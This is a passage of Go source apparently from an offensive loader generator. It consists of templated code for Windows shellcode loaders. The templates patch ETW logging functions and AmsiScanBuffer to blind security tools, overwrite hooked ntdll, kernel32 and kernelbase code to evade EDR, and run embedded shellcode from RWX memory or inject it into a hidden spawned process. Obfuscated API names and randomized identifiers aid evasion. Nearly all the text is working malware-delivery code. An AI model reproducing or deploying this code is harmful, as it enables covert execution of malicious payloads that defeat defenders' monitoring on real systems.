			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
				{{.Variables.SyscallNumberlist}}

	}
	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
		var {{.Variables.decoded}} []byte
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
		{{.Variables.sum}} := 1
		for i := 1; i < {{.Variables.number}}; i++ {
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
			{{.Variables.sum}} += i
		}
		return string({{.Variables.decoded}})
	
	}	

	{{.Variables.WriteProcessMemory_Function}}

	{{.Variables.ETW_Function}}

	{{.Variables.AMSI_Function}}

	func main() {
	}

	{{.Variables.ExportName}}


	//export Run
	func Run() {
		{{.Variables.Sandbox}}
		{{.Variables.Versionfunc}}()
		{{.Variables.ETW}}
		{{.Variables.AMSI}}
		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
		var {{.Variables.phandle}} uint64
		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
		for x, y := range []byte({{.Variables.raw_bin}}) {
			{{.Variables.buff}} [x] = y
		}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
	}

`
}

func WriteProcessMemory_Function() string {
	return `
	const (
		{{.Variables.errnoERROR_IO_PENDING}}= 997
	)
	var {{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.WriteProcessMemoryName}}"))


	func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} uintptr, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} *byte, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = {{.Variables.errnoErr}}(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func {{.Variables.errnoErr}}(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case {{.Variables.errnoERROR_IO_PENDING}}:
			return {{.Variables.errERROR_IO_PENDING}}
		}
	
		return e
	}
	`
}

func WindowsVersion_Syscall() string {
	return `
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.customsyscall}} = 0x18
			{{.Variables.customsyscallVP}} = 0x50
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x17
			{{.Variables.customsyscallVP}} = 0x4f
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x16
			{{.Variables.customsyscallVP}} = 0x4e
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}} = 0x15
			{{.Variables.customsyscallVP}}= 0x4d
		}
		return {{.Variables.Version}} 
`
}

func WindowsVersion_Syscall_Unmod() string {
	return `
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.customsyscall}} = 0x18
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x17
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x16
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}} = 0x15
		}
`
}

func ETW_Function() string {
	return `
	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventRegisterName}}"))
	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteFullName}}"))
	var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteName}}"))

	func {{.Variables.ETW}}() {
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr(), {{.Variables.procEtwEventWrite}}.Addr()}
		for i, _ := range {{.Variables.dataAddr}} {
			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
			var {{.Variables.nLength}} uintptr
			{{.Variables.datalength}} := len({{.Variables.data}})
			{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, {{.Variables.dataAddr}}[i], &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
		}
	}

`
}

func AMSI_Function() string {
	return `
	func {{.Variables.AMSI}}() {
		var {{.Variables.handle}} uint64
		{{.Variables.handle}} = 0xffffffffffffffff
		{{.Variables.ll}}, _ := windows.LoadLibrary("amsi.dll")
		{{.Variables.addr}}, _ := windows.GetProcAddress({{.Variables.ll}}, "AmsiScanBuffer")
		{{.Variables.data}}, _ :=  hex.DecodeString("B857000780C3")
		var {{.Variables.nLength}} uintptr
		{{.Variables.datalength}} := len({{.Variables.data}})
		{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), uintptr(uint({{.Variables.addr}})), &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
	}
	`
}

func Procces_Injection_DLL() string {
	return `
	package main

	import "C"

	import (

		"debug/pe"
		"encoding/base64"
		"encoding/hex"
		"fmt"
		"[loader]/[loader]"
		"io/ioutil"
		"syscall"
		"time"
		"unsafe"
		"strconv"

		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"

	)

const (
	{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
)
var _ unsafe.Pointer
var (
	{{.Variables.customsyscall}} uint16
	{{.Variables.customsyscallVP}} uint16
	{{.Variables.Version}} string
	{{.Variables.number}} int = {{.Variables.b64number}}
)


var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtCreateThreadEx")
var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtWriteVirtualMemory")
var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtAllocateVirtualMemory")
var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtProtectVirtualMemory")

var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("EnumProcessModules")
var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleBaseNameW")
var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleInformation")


func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

func (e *SyscallError) Error() string {
	return fmt.Sprintf("%s: %v", e.call, e.err)
}

const (
	MEM_FREE    = 0x100 << 8
	MEM_COMMIT  = 0x10 << 8
	MEM_RESERVE = 0x20 << 8
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

type MemoryBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

func {{.Variables.CreateProcess}}() *syscall.ProcessInformation {
	var {{.Variables.si}} syscall.StartupInfo
	var {{.Variables.pi}} syscall.ProcessInformation

	{{.Variables.Target}} := "{{.Variables.processpath}}"
	{{.Variables.commandLine}}, {{.Variables.err}} := syscall.UTF16PtrFromString({{.Variables.Target}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}
	var {{.Variables.startupInfo}} StartupInfoEx
	{{.Variables.si}}.Cb = uint32(unsafe.Sizeof({{.Variables.startupInfo}}))
	{{.Variables.si}}.Flags |= windows.STARTF_USESHOWWINDOW
	{{.Variables.si}}.ShowWindow = windows.SW_HIDE

	{{.Variables.err}} = syscall.CreateProcess(
		nil,
		{{.Variables.commandLine}},
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&{{.Variables.si}},
		&{{.Variables.pi}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}

	return &{{.Variables.pi}}
}
func {{.Variables.GetModuleInformation}}({{.Variables.hProcess}} windows.Handle, {{.Variables.hModule}} windows.Handle) (MODULEINFO, error) {
	{{.Variables.mi}} := MODULEINFO{}
	_, _, {{.Variables.err}} := {{.Variables.procGetModuleInformation}}.Call(
		uintptr({{.Variables.hProcess}}),
		uintptr({{.Variables.hModule}}),
		uintptr(unsafe.Pointer(&{{.Variables.mi}})),
		uintptr(uint32(unsafe.Sizeof({{.Variables.mi}}))))
	if {{.Variables.err}}.(syscall.Errno) != 0 {
		return {{.Variables.mi}}, {{.Variables.err}}
	}
	return {{.Variables.mi}}, nil
}

func {{.Variables.GetModuleBaseName}}({{.Variables.process}} windows.Handle, {{.Variables.module}} windows.Handle, {{.Variables.outString}} *uint16, {{.Variables.size}} uint32) ({{.Variables.n}} int, err error) {
	r1, _, e1 := {{.Variables.procGetModuleBaseName}}.Call(
		uintptr({{.Variables.process}}),
		uintptr({{.Variables.module}}),
		uintptr(unsafe.Pointer({{.Variables.outString}})),
		uintptr({{.Variables.size}}),
	)
	if r1 == 0 {
		return 0, errno(e1)
	}
	return int(r1), nil
}

func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{.Variables.modules}} []windows.Handle) ({{.Variables.n}} int, {{.Variables.err}} error) {
	var {{.Variables.needed}} int32
	const {{.Variables.handleSize}} = unsafe.Sizeof({{.Variables.modules}}[0])
	r1, _, e1 := {{.Variables.procEnumProcessModules}}.Call(
		uintptr({{.Variables.process}}),
		uintptr(unsafe.Pointer(&{{.Variables.modules}}[0])),
		{{.Variables.handleSize}}*uintptr(len({{.Variables.modules}})),
		uintptr(unsafe.Pointer(&{{.Variables.needed}})),
	)
	if r1 == 0 {
		{{.Variables.err}} = errno(e1)
		return 0, {{.Variables.err}}
	}
	{{.Variables.n}} = int(uintptr({{.Variables.needed}}) / {{.Variables.handleSize}})
	return {{.Variables.n}}, nil
}

func {{.Variables.decode}}({{.Variables.b64}} string,) string {
	var {{.Variables.decoded}} []byte
		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
	{{.Variables.sum}} := 1
	for i := 1; i < {{.Variables.number}}; i++ {
		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
		{{.Variables.sum}} += i
	}
	return string({{.Variables.decoded}})

}


{{.Variables.Sandboxfunction}}


func {{.Variables.Versionfunc}}() string {
	{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
	{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
		{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
	}
	defer {{.Variables.k}}.Close()
		{{.Variables.SyscallNumberlist}}

}

{{.Variables.WriteProcessMemory_Function}}

{{.Variables.ETW_Function}}

{{.Variables.AMSI_Function}}


func {{.Variables.loader}}()  {
	err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	if err != nil {
	}
	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
	if err != nil {
	}
	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	if err != nil {
	}
}

func {{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}} []byte) {
	{{.Variables.pi}} := {{.Variables.CreateProcess}}()
	time.Sleep(5 * time.Second)
	if {{.Variables.Version}} == "10.0" {
		{{.Variables.hh}}, {{.Variables.err}} := windows.OpenProcess({{.Variables.PROCESS_ALL_ACCESS}}, false, {{.Variables.pi}}.ProcessId)
		if {{.Variables.err}} != nil {
		}
		{{.Variables.modules}} := make([]windows.Handle, 255)
		{{.Variables.n}}, {{.Variables.err}} := {{.Variables.EnumProcessModules}}({{.Variables.hh}}, {{.Variables.modules}})
		if {{.Variables.err}} != nil {
			fmt.Println(&SyscallError{"EnumProcessModules", {{.Variables.err}}})
		}
		if {{.Variables.n}} < len({{.Variables.modules}}) {
			{{.Variables.modules}} = {{.Variables.modules}}[:{{.Variables.n}}]
		}
		var {{.Variables.buf}} = make([]uint16, 255)
		for _, {{.Variables.mod}} := range {{.Variables.modules}} {
			{{.Variables.MI}}, _ := {{.Variables.GetModuleInformation}}({{.Variables.hh}}, {{.Variables.mod}})
			{{.Variables.n}}, {{.Variables.err}} := {{.Variables.GetModuleBaseName}}({{.Variables.hh}}, {{.Variables.mod}}, &{{.Variables.buf}}[0], uint32(len({{.Variables.buf}})))
			if {{.Variables.err}} != nil {
			}
			{{.Variables.s}} := windows.UTF16ToString({{.Variables.buf}}[:{{.Variables.n}}])
			if {{.Variables.s}} == "ntdll.dll" {
				{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\ntdll.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			}
			if {{.Variables.s}} == "KERNEL32.DLL" {
				{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernel32.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			}
			if {{.Variables.s}} == "KERNELBASE.dll" {
				{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernelbase.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			}
		}
	}
	{{.Variables.shellcode}}  := {{.Variables.raw_bin}}
	{{.Variables.oldProtect}} := windows.PAGE_READWRITE
	var {{.Variables.lpBaseAddress}} uintptr
	{{.Variables.size}} := len({{.Variables.shellcode}})

	{{.Variables.funcNtAllocateVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), 0, uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	{{.Variables.funcNtWriteVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, uintptr(unsafe.Pointer(&{{.Variables.shellcode}}[0])), uintptr({{.Variables.size}}), 0)

	{{.Variables.funcNtProtectVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Variables.oldProtect}})))

	{{.Variables.funcNtCreateThreadEx}}.Call(uintptr(unsafe.Pointer(&{{.Variables.pi}}.Thread)), windows.GENERIC_EXECUTE, 0, uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, {{.Variables.lpBaseAddress}}, 0, 0, 0, 0, 0)

	syscall.CloseHandle({{.Variables.pi}}.Thread)

}

func main() {
}

{{.Variables.ExportName}}


//export Run
func Run() {
	{{.Variables.Sandbox}}
	{{.Variables.ETW}}
	{{.Variables.AMSI}}
	{{.Variables.Version}} = {{.Variables.Versionfunc}}()
	if {{.Variables.Version}} == "10.0" {
		{{.Variables.loader}}()
	}
	{{.Variables.ETW}}
	{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
	{{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}})
}


func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variables.addr}} uintptr, {{.Variables.handle}} windows.Handle) error {
	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
	{{.Variables.dllBase}} := {{.Variables.addr}}
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.rawbytes}} := fmt.Sprintf("%X", {{.Variables.bytes}})
	{{.Variables.data}}, _ := hex.DecodeString(string({{.Variables.rawbytes}}))
	{{.Variables.regionsize}} := len({{.Variables.bytes}})
	{{.Variables.offsetaddr}} := uintptr({{.Variables.dllOffset}})
	var {{.Variables.nLength}} uintptr
	{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.offsetaddr}}, &{{.Variables.data}}[0], uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})
	
	return nil
}



func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
	{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
	var {{.Variables.oldfartcodeperms}} uintptr

	{{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, uintptr({{.Variables.dllOffset}}), &{{.Variables.bytes}}[0], uintptr(uint32(len({{.Variables.bytes}}))), & {{.Variables.oldfartcodeperms}})

	return nil
}
	
	
	`
}

func Procces_Injection() string {
	return `
	package main


	import (

		"debug/pe"
		"encoding/base64"
		"encoding/hex"
		"[loader]/[loader]"
		{{.Variables.DebugImport}}
		"io/ioutil"
		"syscall"
		"fmt"
		"time"
		"unsafe"
		"strconv"
		{{.Variables.SandboxOS}}

		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"

	)

const (
	{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
)
var _ unsafe.Pointer

var (
	{{.Variables.customsyscall}} uint16
	{{.Variables.customsyscallVP}} uint16
	{{.Variables.number}} int = {{.Variables.b64number}}
)


var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtCreateThreadEx")
var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtWriteVirtualMemory")
var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtAllocateVirtualMemory")
var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtProtectVirtualMemory")

var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("EnumProcessModules")
var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleBaseNameW")
var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleInformation")

{{.Variables.Debug}}


func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

func (e *SyscallError) Error() string {
	return fmt.Sprintf("%s: %v", e.call, e.err)
}

const (
	MEM_FREE    = 0x100 << 8
	MEM_COMMIT  = 0x10 << 8
	MEM_RESERVE = 0x20 << 8
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

type MemoryBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

func {{.Variables.CreateProcess}}() *syscall.ProcessInformation {
	var {{.Variables.si}} syscall.StartupInfo
	var {{.Variables.pi}} syscall.ProcessInformation

	{{.Variables.Target}} := "{{.Variables.processpath}}"
	{{.Variables.commandLine}}, {{.Variables.err}} := syscall.UTF16PtrFromString({{.Variables.Target}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}
	var {{.Variables.startupInfo}} StartupInfoEx
	{{.Variables.si}}.Cb = uint32(unsafe.Sizeof({{.Variables.startupInfo}}))
	{{.Variables.si}}.Flags |= windows.STARTF_USESHOWWINDOW
	{{.Variables.si}}.ShowWindow = windows.SW_HIDE

	{{.Variables.err}} = syscall.CreateProcess(
		nil,
		{{.Variables.commandLine}},
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&{{.Variables.si}},
		&{{.Variables.pi}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}

	return &{{.Variables.pi}}
}
func {{.Variables.GetModuleInformation}}({{.Variables.hProcess}} windows.Handle, {{.Variables.hModule}} windows.Handle) (MODULEINFO, error) {
	{{.Variables.mi}} := MODULEINFO{}
	_, _, {{.Variables.err}} := {{.Variables.procGetModuleInformation}}.Call(
		uintptr({{.Variables.hProcess}}),
		uintptr({{.Variables.hModule}}),
		uintptr(unsafe.Pointer(&{{.Variables.mi}})),
		uintptr(uint32(unsafe.Sizeof({{.Variables.mi}}))))
	if {{.Variables.err}}.(syscall.Errno) != 0 {
		return {{.Variables.mi}}, {{.Variables.err}}
	}
	return {{.Variables.mi}}, nil
}

func {{.Variables.GetModuleBaseName}}({{.Variables.process}} windows.Handle, {{.Variables.module}} windows.Handle, {{.Variables.outString}} *uint16, {{.Variables.size}} uint32) ({{.Variables.n}} int, err error) {
	r1, _, e1 := {{.Variables.procGetModuleBaseName}}.Call(
		uintptr({{.Variables.process}}),
		uintptr({{.Variables.module}}),
		uintptr(unsafe.Pointer({{.Variables.outString}})),
		uintptr({{.Variables.size}}),
	)
	if r1 == 0 {
		return 0, errno(e1)
	}
	return int(r1), nil
}

func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{.Variables.modules}} []windows.Handle) ({{.Variables.n}} int, {{.Variables.err}} error) {
	var {{.Variables.needed}} int32
	const {{.Variables.handleSize}} = unsafe.Sizeof({{.Variables.modules}}[0])
	r1, _, e1 := {{.Variables.procEnumProcessModules}}.Call(
		uintptr({{.Variables.process}}),
		uintptr(unsafe.Pointer(&{{.Variables.modules}}[0])),
		{{.Variables.handleSize}}*uintptr(len({{.Variables.modules}})),
		uintptr(unsafe.Pointer(&{{.Variables.needed}})),
	)
	if r1 == 0 {
		{{.Variables.err}} = errno(e1)
		return 0, {{.Variables.err}}
	}
	{{.Variables.n}} = int(uintptr({{.Variables.needed}}) / {{.Variables.handleSize}})
	return {{.Variables.n}}, nil
}

func {{.Variables.decode}}({{.Variables.b64}} string,) string {
	var {{.Variables.decoded}} []byte
		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
	{{.Variables.sum}} := 1
	for i := 1; i < {{.Variables.number}}; i++ {
		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
		{{.Variables.sum}} += i
	}
	return string({{.Variables.decoded}})

}

{{.Variables.Sandboxfunction}}


func {{.Variables.Console}}(show bool) {
	{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
	{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
	{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
	if {{.Variables.hwnd}} == 0 {
		return
	}
	if show {
	var {{.Variables.SW_RESTORE}} uintptr = 9
	{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
	} else {
	var {{.Variables.SW_HIDE}} uintptr = 0
	{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
	}
}

func {{.Variables.Versionfunc}}() string {
	{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
	{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
		{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
	}
	defer {{.Variables.k}}.Close()
	{{.Variables.VersionMessage}}
		{{.Variables.SyscallNumberlist}}

}



{{.Variables.WriteProcessMemory_Function}}

{{.Variables.ETW_Function}}

{{.Variables.AMSI_Function}}

func {{.Variables.loader}}()  {
